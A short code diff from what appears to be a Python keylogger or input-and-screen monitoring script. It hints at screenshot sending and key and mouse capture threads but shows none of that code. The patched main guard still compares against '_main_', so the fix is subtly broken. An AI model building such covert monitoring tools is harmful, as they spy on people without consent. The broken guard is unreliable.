@@ -206,7 +206,7 @@ def send_screenshot():
 
 
 
-if _name_ == "_main_":
+if __name__ == "_main_":
     # threads for key, mouse:
     key_thread = Thread(target=key_events)
     mouse_thread = Thread(target=mouse_handeling)
